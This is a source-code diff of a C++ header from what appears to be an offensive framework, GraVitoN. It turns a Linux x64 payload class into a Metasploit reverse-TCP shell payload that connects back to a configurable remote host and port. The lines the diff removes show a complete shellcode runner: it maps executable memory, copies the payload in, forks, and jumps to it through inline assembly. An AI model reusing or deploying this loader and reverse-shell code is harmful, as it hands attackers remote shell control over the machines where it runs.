@@ -27,7 +27,7 @@
 #ifndef _GVN_PAYLOAD_LINUX64R_HEAD_
 #define _GVN_PAYLOAD_LINUX64R_HEAD_
 
-#include "../gvn_payload.hpp"
+#include <payload/payload.hpp>
 
 #include <cstdio>
 #include <cstdlib>
@@ -37,24 +37,32 @@
 #include <errno.h>
 #include <unistd.h>
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
- * @brief A bind shell for linux x64
+ * @brief A reverse shell for linux x64
  *
  */
-class Payload_Linux64r : public GraVitoN::Bin_Payload
+class Linux_MSF_Shell_Reverse_64 : public GraVitoN::Payload::Binary_Payload
 {
+private:
+    string host;
+    unsigned int port;
+
 protected:
 	virtual bool initPayload();
 
 public:
 	/// Constructor
-    Payload_Linux64r();
+    Linux_MSF_Shell_Reverse_64();
 
 	/// Destructor
-    virtual ~Payload_Linux64r();
+    virtual ~Linux_MSF_Shell_Reverse_64();
 
 	/**
 	 * @brief Initialize
@@ -62,37 +70,26 @@ public:
 	 * @param [in] _options
 	 *
 	 * @options
-	 * PORT: reverse bind port, HOST: server
+     * port: reverse bind port, remote_host: msf server
 	 *
 	 */
-    virtual bool initialize ( const string &_options );
-
-	/// @see Payload::run()
-	virtual bool run();
+    virtual bool initialize ( const string &remote_host, const unsigned int &remote_port);
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Linux64r::Payload_Linux64r()
+Linux_MSF_Shell_Reverse_64::Linux_MSF_Shell_Reverse_64()
 {
     jumper = _null_;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Linux64r::~Payload_Linux64r()
+Linux_MSF_Shell_Reverse_64::~Linux_MSF_Shell_Reverse_64()
 {
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Linux64r::initPayload()
-{
-	
-    int port = 7357;
-	string host;
-	/// Parse options
-	OptParser::getValueAsInt(options, "PORT", port);
-	OptParser::getValueAsString(options, "HOST", host);
-	Logger::logVariable("HOST", host);
-	
+bool Linux_MSF_Shell_Reverse_64::initPayload()
+{	
 	/*
 	 * linux/x64/shell/reverse_tcp - 68 bytes (stage 1)
 	 * http://www.metasploit.com
@@ -134,77 +131,18 @@ bool Payload_Linux64r::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Linux64r::initialize ( const string &_options )
+bool Linux_MSF_Shell_Reverse_64::initialize (const string &remote_host, const unsigned int &remote_port)
 {
-    options = _options;
+    host = remote_host;
+    port = remote_port;
 
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
-
-	/// Copy payload to heap and set RWX permisson
-    // jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-	/// During my linux tests, I discoverd that mmap is better than mprotect
-	jumper = ( void ( * ) ( void* ) ) mmap( 0, payload_size,
-											PROT_READ | PROT_WRITE | PROT_EXEC,
-											MAP_SHARED | MAP_ANONYMOUS,
-											-1, 0 );
-
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Linux64r::run()
-{
-	/// Fork
-    Logger::logItLn ("Forking...");
-	int pid = fork();
-
-
-	/// If i'm child process
-	if ( pid == 0 )
-	{
-		/*
-		/// Set Page Permissions
-		unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
-		if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
-			Logger::logIt ( "mprotect failed - errorno: " );
-			Logger::logItLn ( errno );
-
-			return false;
-		}
-		*/
-
-		/// A Little Delay!
-		int _delay = 320;
-		while ( _delay > 0 ) {
-			--_delay;
-		}
-
-		/// Jumping to starting address of payload
-
-		int useless_out = 0;
-		Logger::logItLn ( "Jumping on Payload..." );
-		asm (
-			"mov %1, %%rbx;"
-			"jmp *%%rbx;"
-			: "=r" ( useless_out )
-			: "r" ( jumper )
-			: "%rbx"
-		);
-
-		exit(0);
-	}
-
-	/// While Child is runnig
-	while( waitpid(pid, NULL, 0) > 0 )
-		sleep(0.01);
-
-	Logger::logItLn ( "call > done" );
-    return true;
 }
-
-
+}
 #endif // _GVN_PAYLOAD_LINUX64R_HEAD_
